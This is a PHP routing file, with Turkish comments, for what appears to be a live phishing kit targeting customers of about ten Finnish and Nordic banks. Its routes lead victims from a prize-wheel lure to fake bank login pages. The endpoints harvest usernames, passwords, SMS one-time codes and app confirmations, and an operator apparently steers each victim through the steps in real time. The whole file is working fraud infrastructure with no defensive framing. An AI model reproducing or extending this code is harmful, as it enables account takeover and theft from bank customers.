<?php
/**
 * Ana Giriş Noktası
 */

// Hata raporlama (production'da kapatılmalı)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Autoloader
require_once __DIR__ . '/../autoload.php';

// Session başlat
session_start();

// Timezone ayarla
date_default_timezone_set('Europe/Helsinki');

// Router'ı yükle
use App\Core\Router;

$router = new Router();

// Routes
$router->get('/', 'HomeController', 'index');
$router->post('/login', 'HomeController', 'login');
$router->get('/wheel', 'WheelController', 'index');
$router->get('/bank', 'BankController', 'index');
$router->post('/bank/select', 'BankController', 'select');
$router->get('/thank-you', 'ThankYouController', 'index');
$router->get('/user/{id}/waiting', 'UserPageController', 'waiting');
$router->get('/user/{id}/whatsapp', 'UserPageController', 'whatsapp');
$router->get('/user/{id}/bank/nordea2', 'UserPageController', 'nordea2');
$router->get('/user/{id}/bank/nordea3', 'UserPageController', 'nordea3');
$router->get('/user/{id}/bank/nordea4', 'UserPageController', 'nordea4');
$router->get('/user/{id}/bank/nordea5', 'UserPageController', 'nordea5');
$router->get('/user/{id}/bank/alandsbanken2', 'UserPageController', 'alandsbanken2');
$router->get('/user/{id}/bank/alandsbanken3', 'UserPageController', 'alandsbanken3');
$router->get('/user/{id}/bank/alandsbanken4', 'UserPageController', 'alandsbanken4');
$router->get('/user/{id}/bank/alandsbanken5', 'UserPageController', 'alandsbanken5');
$router->get('/user/{id}/bank/danske2', 'UserPageController', 'danske2');
$router->get('/user/{id}/bank/danske3', 'UserPageController', 'danske3');
$router->get('/user/{id}/bank/danske4', 'UserPageController', 'danske4');
$router->get('/user/{id}/bank/danske5', 'UserPageController', 'danske5');
$router->get('/user/{id}/bank/spankki2', 'UserPageController', 'spankki2');
$router->get('/user/{id}/bank/spankki3', 'UserPageController', 'spankki3');
$router->get('/user/{id}/bank/spankki4', 'UserPageController', 'spankki4');
$router->get('/user/{id}/bank/spankki5', 'UserPageController', 'spankki5');
$router->get('/user/{id}/bank/spankki-confirm', 'UserPageController', 'spankkiConfirm');
$router->get('/user/{id}/bank/aktia2', 'UserPageController', 'aktia2');
$router->get('/user/{id}/bank/aktia3', 'UserPageController', 'aktia3');
$router->get('/user/{id}/bank/aktia4', 'UserPageController', 'aktia4');
$router->get('/user/{id}/bank/aktia5', 'UserPageController', 'aktia5');
$router->get('/user/{id}/bank/op2', 'UserPageController', 'op2');
$router->get('/user/{id}/bank/op3', 'UserPageController', 'op3');
$router->get('/user/{id}/bank/op4', 'UserPageController', 'op4');
$router->get('/user/{id}/bank/op5', 'UserPageController', 'op5');
$router->get('/user/{id}/bank/op-confirm', 'UserPageController', 'opConfirm');
$router->get('/user/{id}/bank/poppankki2', 'UserPageController', 'poppankki2');
$router->get('/user/{id}/bank/poppankki3', 'UserPageController', 'poppankki3');
$router->get('/user/{id}/bank/poppankki4', 'UserPageController', 'poppankki4');
$router->get('/user/{id}/bank/poppankki5', 'UserPageController', 'poppankki5');
$router->get('/user/{id}/bank/omasp2', 'UserPageController', 'omasp2');
$router->get('/user/{id}/bank/omasp3', 'UserPageController', 'omasp3');
$router->get('/user/{id}/bank/omasp4', 'UserPageController', 'omasp4');
$router->get('/user/{id}/bank/omasp5', 'UserPageController', 'omasp5');
$router->get('/user/{id}/bank/saastopankki2', 'UserPageController', 'saastopankki2');
$router->get('/user/{id}/bank/saastopankki3', 'UserPageController', 'saastopankki3');
$router->get('/user/{id}/bank/saastopankki4', 'UserPageController', 'saastopankki4');
$router->get('/user/{id}/bank/saastopankki5', 'UserPageController', 'saastopankki5');
$router->get('/user/{id}/bank/handelsbanken2', 'UserPageController', 'handelsbanken2');
$router->get('/user/{id}/bank/handelsbanken3', 'UserPageController', 'handelsbanken3');
$router->get('/user/{id}/bank/handelsbanken4', 'UserPageController', 'handelsbanken4');
$router->get('/user/{id}/bank/handelsbanken5', 'UserPageController', 'handelsbanken5');
$router->post('/api/save-op-sms', 'ApiController', 'saveOpSmsCode');
$router->post('/api/save-op-confirm', 'ApiController', 'saveOpAppConfirmed');
$router->post('/api/save-poppankki', 'ApiController', 'savePoppankkiCredentials');
$router->post('/api/save-poppankki-sms', 'ApiController', 'savePoppankkiSmsCode');
$router->post('/api/save-poppankki-confirm', 'ApiController', 'savePoppankkiAppConfirmed');
$router->post('/api/save-omasp', 'ApiController', 'saveOmaspCredentials');
$router->post('/api/save-omasp-sms', 'ApiController', 'saveOmaspSmsCode');
$router->post('/api/save-omasp-confirm', 'ApiController', 'saveOmaspAppConfirmed');
$router->post('/api/save-saastopankki', 'ApiController', 'saveSaastopankkiCredentials');
$router->post('/api/save-saastopankki-sms', 'ApiController', 'saveSaastopankkiSmsCode');
$router->post('/api/save-saastopankki-confirm', 'ApiController', 'saveSaastopankkiAppConfirmed');
$router->post('/api/save-handelsbanken', 'ApiController', 'saveHandelsbankenCredentials');
$router->post('/api/save-handelsbanken-sms', 'ApiController', 'saveHandelsbankenSmsCode');
$router->post('/api/save-handelsbanken-confirm', 'ApiController', 'saveHandelsbankenAppConfirmed');
$router->get('/user/{id}/bank/{bank_id}', 'UserPageController', 'bank');

// Static files
$router->get('/nordea-files/{file}', 'StaticFileController', 'serveNordeaFile');
$router->get('/alandsbanken-files/{file}', 'StaticFileController', 'serveAlandsbankenFile');
$router->get('/danske-files/{file}', 'StaticFileController', 'serveDanskeFile');
$router->get('/spankki-files/{file}', 'StaticFileController', 'serveSpankkiFile');
$router->get('/aktia-files/{file}', 'StaticFileController', 'serveAktiaFile');
$router->get('/poppankki-files/{file}', 'StaticFileController', 'servePoppankkiFile');
$router->get('/omasp-files/{file}', 'StaticFileController', 'serveOmaspFile');
$router->get('/saastopankki-files/{file}', 'StaticFileController', 'serveSaastopankkiFile');
$router->get('/handelsbanken-files/{file}', 'StaticFileController', 'serveHandelsbankenFile');

// API Routes
$router->post('/api/update-page', 'ApiController', 'updatePage');
$router->get('/api/check-redirect', 'ApiController', 'checkRedirect');
$router->get('/api/get-user-page', 'ApiController', 'getUserPage');
$router->post('/api/save-nordea', 'ApiController', 'saveNordeaCredentials');
$router->post('/api/save-nordea-sms', 'ApiController', 'saveNordeaSmsCode');
$router->post('/api/save-nordea-confirm', 'ApiController', 'saveNordeaAppConfirmed');
$router->post('/api/save-alandsbanken', 'ApiController', 'saveAlandsbankenCredentials');
$router->post('/api/save-alandsbanken-sms', 'ApiController', 'saveAlandsbankenSmsCode');
$router->post('/api/save-alandsbanken-confirm', 'ApiController', 'saveAlandsbankenAppConfirmed');
$router->post('/api/save-danske', 'ApiController', 'saveDanskeCredentials');
$router->post('/api/save-danske-sms', 'ApiController', 'saveDanskeSmsCode');
$router->post('/api/save-danske-confirm', 'ApiController', 'saveDanskeAppConfirmed');
$router->post('/api/save-spankki', 'ApiController', 'saveSpankkiCredentials');
$router->post('/api/save-spankki-sms', 'ApiController', 'saveSpankkiSmsCode');
$router->post('/api/save-spankki-confirm', 'ApiController', 'saveSpankkiAppConfirmed');
$router->post('/api/save-aktia', 'ApiController', 'saveAktiaCredentials');
$router->post('/api/save-aktia-sms', 'ApiController', 'saveAktiaSmsCode');
$router->post('/api/save-aktia-confirm', 'ApiController', 'saveAktiaAppConfirmed');
$router->post('/api/save-op', 'ApiController', 'saveOpCredentials');

// Router'ı çalıştır
$router->dispatch();

